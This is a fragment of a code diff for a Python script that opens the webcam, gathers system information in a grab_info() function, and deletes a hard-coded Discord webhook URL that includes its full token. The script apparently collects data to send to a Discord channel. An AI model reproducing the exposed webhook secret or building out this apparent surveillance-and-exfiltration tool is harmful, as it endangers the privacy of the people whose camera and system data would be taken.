@@ -11,7 +11,7 @@ import cv2
 
 cap = cv2.VideoCapture(0)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1311015529875640380/SRcH0uuSO7pQVHukyDSUqm1XnVMLcjKICwyBjJFz-8pYjhE9c09ipq9Fq-Hj-lEWhkDD"
+WEBHOOK_URL = ""
 
 def grab_info():
     system_platform = platform.system()
